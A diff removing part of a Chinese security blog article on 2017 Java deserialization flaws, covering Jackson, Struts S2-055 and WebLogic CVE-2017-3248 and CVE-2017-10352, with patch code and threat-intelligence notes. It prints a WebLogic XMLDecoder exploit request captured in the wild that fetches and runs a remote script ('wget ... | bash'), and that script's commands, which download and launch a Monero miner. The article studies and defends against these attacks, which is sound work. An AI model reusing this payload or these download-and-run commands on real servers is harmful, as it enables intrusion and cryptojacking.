-<p>在clientName上方添加注解，打开支持多态的特性，这样我们就能指定clientName的类型；另一个是将clientName的类型改为Object类型，这样就避免了类型不匹配或者不是其子类的错误。<br>另外Jackson不是默认句柄，需要设置ContentTypeHandler，这样当Content-Type为application/json格式的请求都交给了JcaksonLibHandler来处理。具体的PoC就是Jackson的PoC，这里不再展示，详情分析见<a href="http://xxlegend.com/2017/12/06/S2-055%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%88%86%E6%9E%90/">5</a>。这个漏洞和S2-052非常类似，都是引用的第三方库存在缺陷导致的漏洞，这样的案例数不胜数，在Java生态中简直就是一个灾难，第三方依赖实在太多。</p>
-<h2 id="4-Weblogic"><a href="#4-Weblogic" class="headerlink" title="4 Weblogic"></a>4 Weblogic</h2><p>在2017年，整个Oracle的产品线都深受反序列化影响，其中Weblogic影响面尤其广泛，很多漏洞的CVSS评分都是9.8，9.9甚至为10。<br><img src="/images/2017_4.png" alt="weblogic"><br>而且CVE-2017-3248的PoC已经在github上，并且被用于黑产，CVE-2017-10352 PoC也被泄露同样被用于黑产。</p>
-<p>###4.1 CVE-2017-3248 分析</p>
-<p>这个漏洞(CVE-2017-3248)就是利用rmi机制的缺陷，通过JRMP协议达到执行任意反序列化payload的目的。利用步骤可以分为两步，第一步建立JRMP监听端口，第二步执行反序列化操作，其反序列化内容指向外部的JRMP监听端口，这样在反序列的过程中就会从远程JRMP监听端口加载内容并执行序列化操作，详细的利用工具可以使用ysoserial。</p>
-<p>###4.2 CVE-2017-10352 分析</p>
-<p>这个漏洞是由于XMLDecoder这个缺陷库存在代码执行问题，同样也是由于被黑产利用而被大家广泛得知。其实在CVE-2017-3506中，Weblogic官方已经做了一次修补，只是当时的修补不够彻底，后来有研究员给Weblogic提供了绕过的PoC，Weblogic官方再次完整修补。同时这个PoC也被泄露，非常多的用户中招。</p>
-<h4 id="4-2-1-补丁"><a href="#4-2-1-补丁" class="headerlink" title="4.2.1 补丁"></a>4.2.1 补丁</h4><p>补丁的核心代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</div><div class="line">   WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</div><div class="line">   <span class="keyword">try</span> &#123;</div><div class="line">      SAXParser parser = factory.newSAXParser();</div><div class="line">      parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</div><div class="line">         <span class="keyword">private</span> <span class="keyword">int</span> overallarraylength = <span class="number">0</span>;</div><div class="line">         <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</div><div class="line">            <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</div><div class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:object"</span>);</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"new"</span>)) &#123;</div><div class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:new"</span>);</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"method"</span>)) &#123;</div><div class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:method"</span>);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"void"</span>)) &#123;</div><div class="line">                  <span class="keyword">for</span>(<span class="keyword">int</span> attClass = <span class="number">0</span>; attClass &lt; attributes.getLength(); ++attClass) &#123;</div><div class="line">                     <span class="keyword">if</span>(!<span class="string">"index"</span>.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</div><div class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid attribute for element void:"</span> + attributes.getQName(attClass));</div><div class="line">                     &#125;</div><div class="line">                  &#125;</div><div class="line">               &#125;</div><div class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"array"</span>)) &#123;</div><div class="line">                  String var9 = attributes.getValue(<span class="string">"class"</span>);</div><div class="line">                  <span class="keyword">if</span>(var9 != <span class="keyword">null</span> &amp;&amp; !var9.equalsIgnoreCase(<span class="string">"byte"</span>)) &#123;</div><div class="line">                     <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"The value of class attribute is not valid for array element."</span>);</div><div class="line">                  &#125;</div></pre></td></tr></table></figure></p>
-<p>这个补丁限定了object，new,method,void，array等字段，就限定了不能生成java 实例。</p>
-<h4 id="4-2-2-分析"><a href="#4-2-2-分析" class="headerlink" title="4.2.2 分析"></a>4.2.2 分析</h4><p>根据补丁大概就得就能猜出相应的PoC，具体如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</div><div class="line">Host: 192.168.3.216:7001</div><div class="line">Accept-Encoding: identity</div><div class="line">Content-Length: 683</div><div class="line">Accept-Language: zh-CN,zh;q=0.8</div><div class="line">Accept: */*</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0</div><div class="line">Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3</div><div class="line">Connection: keep-alive</div><div class="line">Cache-Control: max-age=0</div><div class="line">Content-Type: text/xml</div><div class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</div><div class="line">  &lt;soapenv:Header&gt;</div><div class="line">    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</div><div class="line">        &lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</div><div class="line">          &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</div><div class="line">            &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</div><div class="line">              。。。。</div><div class="line">          &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</div><div class="line">        &lt;/java&gt;</div><div class="line">      &lt;/work:WorkContext&gt;</div><div class="line">    &lt;/soapenv:Header&gt;</div><div class="line">  &lt;soapenv:Body/&gt;</div><div class="line">&lt;/soapenv:Envelope&gt;</div></pre></td></tr></table></figure></p>
-<p>在动态调试过程中这个调用栈非常深，我们简单解释一下关键的几个部位，首先是WorkContextServerTube.java中processRequest方法，主要功能就是分割整个xml，抽取真正执行的xml交给readHeadOld方法，也就是请求中soapenv:Header包裹的部分，这一部分最终会交给XMLDecoder，XMLDecoder完成数据到对象的转换，即会执行恶意代码。并且wls-wsat是一个特权应用，无需用户名密码验证，所以危害非常大。<br>更多详情分析可参考文档 <a href="http://blog.nsfocus.net/weblogic-xmldecoder-rce/" target="_blank" rel="external">6</a> , 同时绿盟科技这篇报告的英文版还被Java-Deserialization-Cheat-Sheet收录。</p>
-<h4 id="4-2-3-黑产利用"><a href="#4-2-3-黑产利用" class="headerlink" title="4.2.3 黑产利用"></a>4.2.3 黑产利用</h4><p>在绿盟的IPS设备或者蜜罐设备就能看到很多这种利用Weblogic XMLDecoder（CVE-2017-10352）进行黑产利用的特征，下面是绿盟IPS抓到的示例，具体如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">srcip为173.212.217.181</div><div class="line"></div><div class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1////0d////0aHost: 58.210.×.×:8001////0d////0aAccept-Encoding: identity////0d////0aContent-Length: 983////0d////0aAccept-Language: zh-CN,zh;q=0.8////0d////0aAccept: */*////0d////0aUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0////0d////0aAccept-Charset: GBK,utf-8;q=0.7,*;q=0.3////0d////0aConnection: keep-alive////0d////0aReferer: http://www.baidu.com////0d////0aCache-Control: max-age=0////0d////0aContent-Type: text/xml////0d////0a////0d////0a&lt;soapenv:Envelope xmlns:soapenv= http://schemas.xmlsoap.org/soap/envelope/ &gt;////0a          &lt;soapenv:Header&gt;////0a            &lt;work:WorkContext xmlns:work= http://bea.com/2004/06/soap/workarea/ &gt;////0a                &lt;java version= 1.8.0_131  class= java.beans.XMLDecoder &gt;////0a                  &lt;void class= java.lang.ProcessBuilder &gt;////0a                    &lt;array class= java.lang.String  length= 3 &gt;////0a                      &lt;void index= 0 &gt;////0a                        &lt;string&gt;/bin/bash&lt;/string&gt;////0a                      &lt;/void&gt;////0a                      &lt;void index= 1 &gt;////0a                        &lt;string&gt;-c&lt;/string&gt;////0a                      &lt;/void&gt;////0a                      &lt;void index= 2 &gt;////0a                        &lt;string&gt;wget -O - 191.101.180.74/robots.txt|bash&lt;/string&gt;////0a                      &lt;/void&gt;////0a                    &lt;/array&gt;////0a                  &lt;void method= start /&gt;&lt;/void&gt;////0a                &lt;/java&gt;////0a              &lt;/work:WorkContext&gt;////0a            &lt;/soapenv:Header&gt;////0a          &lt;soapenv:Body/&gt;////0a        &lt;/soapenv:Envelope&gt;</div></pre></td></tr></table></figure></p>
-<p>对于linux系统会去191.101.180.74下载一个bash脚本执行挖坑行为（门罗币）。这个robots.txt的核心内容如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">wget -q http://45.123.190.178/Silence -O /tmp/Silence</div><div class="line">curl -o /tmp/Silence http://45.123.190.178/Silence</div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="built_in">exit</span> 0;</div><div class="line"><span class="keyword">fi</span></div><div class="line">chmod +x /tmp/Silence</div><div class="line">nohup /tmp/Silence -B <span class="_">-a</span> cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 44pgg5mYVH6Gnc7gKfWGPR2CxfQLhwdrCPJGzLonwrSt5CKSeEy6izyjEnRn114HTU7AWFTp1SMZ6eqQfvrdeGWzUdrADDu -p x -R 1 &amp;&gt;&gt;/dev/null &amp;</div><div class="line">sleep 10</div><div class="line">rm -rf /tmp/Silence</div></pre></td></tr></table></figure></p>
-<p>对srcip：173.212.217.181溯源跟踪，从绿盟科技威胁情报中心NTI中的数据也能看出，该IP从2017年8月份开始，一直被用于特定漏洞扫描以便发现更多具有脆弱性的主机。<img src="/images/2017_5.png" alt="nti数据"></p>
-<p>#总结<br>从OWASP 2017 top ten报告中可以看出反序列化是一个业内都开始关注重视的漏洞类型，一个原因就是该漏洞很多时候都是通过黑名单的方式的修复，这就导致了层出不穷的绕过，从Jackson，fastjson，weblogic一见端倪，都是修复，绕过，再修复，再绕过，没有尽头。另外一个原因就是该漏洞的危害非常大，通常都是RCE，一个PoC直接获取系统权限，不管是黑产，灰产，开发，运维还有白帽安全人员都非常重视该类型的漏洞。从系统的重要性来看，国内很多商业系统都是基于Java框架开发，这些中间件或者Web容器一旦出现漏洞，整个系统都变得不堪一击，可能造成不可挽回的影响。<br>对于反序列漏洞的防御，业内也是一个难题，首先得确保所有的依赖库和容器已经更新到最新版本，这样能防止已知漏洞的攻击。另外绿盟科技的IPS，WAF都已经具备对这些漏洞的防护能力，更多的防护策略请参考绿盟科技下一篇关于反序列化漏洞防御的文档。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-    <! -- 添加微信图标 -->
-    
-      
-    
-    
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2264,7 +2224,7 @@ class java.lang.ProcessBuilder</code></p>
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">34</span>
+                <span class="site-state-item-count">35</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2275,7 +2235,7 @@ class java.lang.ProcessBuilder</code></p>
             
             <div class="site-state-item site-state-categories">
               
-                <span class="site-state-item-count">16</span>
+                <span class="site-state-item-count">17</span>
                 <span class="site-state-item-name">分类</span>
               
             </div>
@@ -2285,8 +2245,8 @@ class java.lang.ProcessBuilder</code></p>
             
             
             <div class="site-state-item site-state-tags">
-              <a href="/tags/index.html">
-                <span class="site-state-item-count">123</span>
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">124</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -2364,7 +2324,7 @@ class java.lang.ProcessBuilder</code></p>
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2019</span>
+  <span itemprop="copyrightYear">2020</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
